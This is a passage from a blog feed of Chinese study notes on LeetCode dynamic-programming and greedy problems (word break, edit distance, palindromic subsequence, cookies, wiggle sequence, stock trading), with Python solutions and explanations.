punctuation">:</span>            <span class="token keyword">if</span> i<span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> j <span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">:</span>j<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token keyword">in</span> wordDict<span class="token punctuation">:</span>                    i<span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span>                    j<span class="token operator">=</span>j<span class="token operator">+</span><span class="token number">1</span>                    <span class="token keyword">continue</span>            <span class="token keyword">if</span> i<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> j<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                flag<span class="token operator">=</span><span class="token boolean">True</span>            <span class="token keyword">elif</span> j<span class="token operator">></span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">and</span> i <span class="token operator">&lt;=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>            j<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> flag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>就是逐个截取</p><p>但是</p><pre class="line-numbers language-none"><code class="language-none">输入s &#x3D;&quot;aaaaaaa&quot;wordDict &#x3D;[&quot;aaaa&quot;,&quot;aaa&quot;] 直接寄了，因为每次先读取aaa  aaa+aaa+a不符合<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>还是想到用动态规划</p><p>我们需要判断一个字符串是否可以由一个字典中的多个单词组合而成，这自然让人想到将问题拆分成更小的子问题。</p><p>具体来说，我们可以考虑字符串的每一个子串，看它是否可以由字典中的单词组成，这可以通过检查之前的子串是否能由字典中的单词组成来实现，从而形成了子问题间的依赖关系。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wordBreak</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> wordDict<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>       <span class="token comment"># 创建一个长度为 len(s) + 1 的布尔型数组 dp</span>        dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token boolean">False</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token comment"># 空字符串总是可以被表示，因此 dp[0] 设为 True</span>        dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token comment"># 遍历字符串 s 的每个子字符串</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># 遍历字典 wordDict 中的每个单词</span>            <span class="token keyword">for</span> word <span class="token keyword">in</span> wordDict<span class="token punctuation">:</span>            <span class="token comment"># 检查以 i 结尾的子字符串是否可以由 wordDict 中的单词组成</span>            <span class="token comment"># 条件：dp[i - len(word)] 为 True 且 s 的子字符串与 word 匹配</span>                <span class="token keyword">if</span> i<span class="token operator">>=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span> <span class="token keyword">and</span> dp<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word<span class="token punctuation">)</span><span class="token punctuation">:</span>i<span class="token punctuation">]</span> <span class="token operator">==</span> word<span class="token punctuation">:</span>                <span class="token comment"># 如果可以，将 dp[i] 设置为 True，并跳出循环</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">True</span>                    <span class="token keyword">break</span>    <span class="token comment"># 返回 dp[len(s)] 的值，表示整个字符串 s 是否可以由 wordDict 中的单词组成</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="516-最长回文子序列"><a class="markdownIt-Anchor" href="#516-最长回文子序列"></a> <a href="https://leetcode.cn/problems/longest-palindromic-subsequence/">516. 最长回文子序列</a></h3><p>给你一个字符串 <code>s</code> ，找出其中最长的回文子序列，并返回该序列的长度。</p><p>子序列定义为：不改变剩余字符顺序的情况下，删除某些字符或者不删除任何字符形成的一个序列。</p><h4 id="思路-25"><a class="markdownIt-Anchor" href="#思路-25"></a> 思路</h4><pre class="line-numbers language-none"><code class="language-none">设置dp[i][j]为字符串s在下标区间i,j之间的最长回文长度dp[i][j]&#x3D;dp[i+1][j-1]+2 当s[i]&#x3D;s[j]dp[i][j]&#x3D;max(dp[i+1][j],dp[i][j-1]) 当s[i]!&#x3D;s[j]然后根据图标确定约束关系，确定遍历顺序比较重要从递推公式dp[i][j] &#x3D; dp[i + 1][j - 1] + 2 和 dp[i][j] &#x3D; max(dp[i + 1][j], dp[i][j - 1]) 可以看出，dp[i][j]是依赖于dp[i + 1][j - 1] 和 dp[i + 1][j]，也就是从矩阵的角度来说，dp[i][j] 下一行的数据。 所以遍历i的时候一定要从下到上遍历，这样才能保证，下一行的数据是经过计算的。如果i&lt;j则认为数据不合法dp[i][j]&#x3D;0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">longestPalindromeSubseq</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> s<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span>        dp<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token comment">#单个字符的长度都是1</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">==</span>s<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span><span class="token number">2</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span><span class="token builtin">max</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="72-编辑距离"><a class="markdownIt-Anchor" href="#72-编辑距离"></a> <a href="https://leetcode.cn/problems/edit-distance/">72. 编辑距离</a></h3><p>给你两个单词 <code>word1</code> 和 <code>word2</code>， <em>请返回将 <code>word1</code> 转换成 <code>word2</code> 所使用的最少操作数</em> 。</p><p>你可以对一个单词进行如下三种操作：</p><ul><li>插入一个字符</li><li>删除一个字符</li><li>替换一个字符</li></ul><pre class="line-numbers language-none"><code class="language-none">现在定义dp[i][j] 代表 word1 中前 i 个字符，变换到 word2 中前 j 个字符，最短需要操作的次数；”现在再来理解“dp[i-1][j-1] 表示替换操作，dp[i-1][j] 表示删除操作，dp[i][j-1] 表示插入操作。”dp[i-1][j-1] (表示替换)：word1的前i-1个字符已经变换到word2的前j-1个字符的次数，说明word1的前i-1个和word2的前j-1个字符已经完成操作；那么对于word1的第i个怎么变成word2的第j个呢？这两个字符都存在，那么只能是替换了；所以dp[i][j] &#x3D; dp[i-1][j-1]+1;dp[i][j-1] (表示插入)：word1的前i个字符已经变换到word2的前j-1个字符的次数，当前word1的第i步字符已经用了，但是word2还差一个字符（因为当前只是处理了word2的前j-1个字符），那么插入一个字符就好了；所以dp[i][j] &#x3D; dp[i][j-1]+1;dp[i-1][j] (表示删除)：word1的前i-1个字符已经变换到word2的前j个字符的次数，当前word1仅用了前i-1个字符就完成了到word2的前j个字符的操作，所以word1的第i个字符其实没啥用了，那么删除操作就好了；所以dp[i][j] &#x3D; dp[i-1][j]+1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>于是</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">minDistance</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> word1<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> word2<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        n1 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word1<span class="token punctuation">)</span>        n2 <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>word2<span class="token punctuation">)</span>        dp <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span>        <span class="token comment"># 第一行</span>        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment"># 第一列</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n1 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> word1<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> word2<span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">min</span><span class="token punctuation">(</span>dp<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> dp<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span>        <span class="token comment">#print(dp)      </span>        <span class="token keyword">return</span> dp<span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="贪心算法"><a class="markdownIt-Anchor" href="#贪心算法"></a> 贪心算法</h1><h2 id="前言-2"><a class="markdownIt-Anchor" href="#前言-2"></a> 前言</h2><p>216073</p><p><strong>贪心的本质是选择每一阶段的局部最优，从而达到全局最优</strong>。</p><p>贪心的算法一般没有套路<strong>最好用的策略就是举反例，如果想不到反例，那么就试一试贪心吧</strong>。</p><p>贪心算法的正确性的数学证明有如下两种方法：</p><ul><li>数学归纳法</li><li>反证法</li></ul><p>事实上，做题直接证明出来，不太现实，只能先推几项，猜测其正确性</p><p><strong>手动模拟一下感觉可以局部最优推出整体最优，而且想不到反例，那么就试一试贪心</strong>。</p><p>贪心算法一般分为如下四步：</p><ul><li>将问题分解为若干个子问题</li><li>找出适合的贪心策略</li><li>求解每一个子问题的最优解</li><li>将局部最优解堆叠成全局最优解</li></ul><p>做题的时候，只要想清楚 局部最优 是什么，如果推导出全局最优，其实就够了</p><h2 id="题目"><a class="markdownIt-Anchor" href="#题目"></a> 题目</h2><h3 id="455-分发饼干"><a class="markdownIt-Anchor" href="#455-分发饼干"></a> <a href="https://leetcode.cn/problems/assign-cookies/">455. 分发饼干</a></h3><p>假设你是一位很棒的家长，想要给你的孩子们一些小饼干。但是，每个孩子最多只能给一块饼干。</p><p>对每个孩子 <code>i</code>，都有一个胃口值 <code>g[i]</code>，这是能让孩子们满足胃口的饼干的最小尺寸；并且每块饼干 <code>j</code>，都有一个尺寸 <code>s[j]</code> 。如果 <code>s[j] &gt;= g[i]</code>，我们可以将这个饼干 <code>j</code> 分配给孩子 <code>i</code> ，这个孩子会得到满足。你的目标是尽可能满足越多数量的孩子，并输出这个最大数值。</p><h4 id="思路-26"><a class="markdownIt-Anchor" href="#思路-26"></a> 思路</h4><p>每个孩子最多只能给一块饼干，那么就要尽量避免饼干尺寸的浪费</p><p>有点和田忌赛马的策略有点类似</p><p>先将饼干数组和小孩数组排序。</p><p>然后从后向前遍历小孩数组，用大饼干优先满足胃口大的，并统计满足小孩数量。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">findContentChildren</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> g<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">,</span> s<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        g<span class="token punctuation">.</span>sort<span class="token punctuation">(</span>reverse<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>        s<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>        index<span class="token operator">=</span><span class="token number">0</span>        <span class="token comment">#贪心:大饼干优先</span>        index<span class="token operator">=</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>  <span class="token comment">#index是饼干的下标</span>        count<span class="token operator">=</span><span class="token number">0</span><span class="token comment">#代表满足的孩子的人数</span>        <span class="token comment">#遍历孩子，从胃口最大的开始</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>g<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> index <span class="token operator">>=</span><span class="token number">0</span> <span class="token keyword">and</span> s<span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token operator">>=</span>g<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>                 index<span class="token operator">-=</span><span class="token number">1</span>                i<span class="token operator">+=</span><span class="token number">1</span>                count<span class="token operator">+=</span><span class="token number">1</span>        <span class="token keyword">return</span> count<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="376-摆动序列"><a class="markdownIt-Anchor" href="#376-摆动序列"></a> <a href="https://leetcode.cn/problems/wiggle-subsequence/">376. 摆动序列</a></h3><p>如果连续数字之间的差严格地在正数和负数之间交替，则数字序列称为 **摆动序列 。**第一个差（如果存在的话）可能是正数或负数。仅有一个元素或者含两个不等元素的序列也视作摆动序列。</p><ul><li>例如， <code>[1, 7, 4, 9, 2, 5]</code> 是一个 <strong>摆动序列</strong> ，因为差值 <code>(6, -3, 5, -7, 3)</code> 是正负交替出现的。</li><li>相反，<code>[1, 4, 7, 2, 5]</code> 和 <code>[1, 7, 4, 5, 5]</code> 不是摆动序列，第一个序列是因为它的前两个差值都是正数，第二个序列是因为它的最后一个差值为零。</li></ul><p><strong>子序列</strong> 可以通过从原始序列中删除一些（也可以不删除）元素来获得，剩下的元素保持其原始顺序。</p><p>给你一个整数数组 <code>nums</code> ，返回 <code>nums</code> 中作为 <strong>摆动序列</strong> 的 <strong>最长子序列的长度</strong> 。</p><h4 id="思路-27"><a class="markdownIt-Anchor" href="#思路-27"></a> 思路</h4><p><strong>局部最优：删除单调坡度上的节点（不包括单调坡度两端的节点），那么这个坡度就可以有两个局部峰值</strong>。</p><p><strong>整体最优：整个序列有最多的局部峰值，从而达到最长摆动序列</strong>。</p><p><strong>实际操作上，其实连删除的操作都不用做，因为题目要求的是最长摆动子序列的长度，所以只需要统计数组的峰值数量就可以了（相当于是删除单一坡度上的节点，然后统计长度）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">wiggleMaxLength</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">1</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span>  <span class="token comment"># 如果数组长度为0或1，则返回数组长度</span>        curDiff <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 当前一对元素的差值</span>        preDiff <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 前一对元素的差值</span>        result <span class="token operator">=</span> <span class="token number">1</span>  <span class="token comment"># 记录峰值的个数，初始为1（默认最右边的元素被视为峰值）</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            curDiff <span class="token operator">=</span> nums<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span>  <span class="token comment"># 计算下一个元素与当前元素的差值</span>            <span class="token comment"># 如果遇到一个峰值</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>preDiff <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token keyword">and</span> curDiff <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token punctuation">(</span>preDiff <span class="token operator">>=</span> <span class="token number">0</span> <span class="token keyword">and</span> curDiff <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                result <span class="token operator">+=</span> <span class="token number">1</span>  <span class="token comment"># 峰值个数加1</span>                preDiff <span class="token operator">=</span> curDiff  <span class="token comment"># 注意这里，只在摆动变化的时候更新preDiff</span>        <span class="token keyword">return</span> result  <span class="token comment"># 返回最长摆动子序列的长度</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="122-买卖股票的最佳时机-ii"><a class="markdownIt-Anchor" href="#122-买卖股票的最佳时机-ii"></a> <a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-ii/">122. 买卖股票的最佳时机 II</a></h3><p>给你一个整数数组 <code>prices</code> ，其中 <code>prices[i]</code> 表示某支股票第 <code>i</code> 天的价格。</p><p>在每一天，你可以决定是否购买和/或出售股票。你在任何时候 <strong>最多</strong> 只能持有 <strong>一股</strong> 股票。你也可以先购买，然后在 <strong>同一天</strong> 出售。</p><p>返回 <em>你能获得的 <strong>最大</strong> 利润</em> 。</p><p><strong>局部最优：收集每天的正利润，全局最优：求得最大利润</strong>。</p><p>以每天为维度，只要每天有正收入就收集</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">maxProfit</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> prices<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">int</span><span class="token punctuation">:</span>        profits<span class="token operator">=</span><span class="token number">0</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>prices<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            profits<span class="token operator">+=</span><span class="token builtin">max</span><span class="token punctuation">(</span>prices<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">-</span>prices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> profits<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SM系列学习笔记</title>
      <link href="/2024/02/21/SM%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/02/21/SM%E7%B3%BB%E5%88%97%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
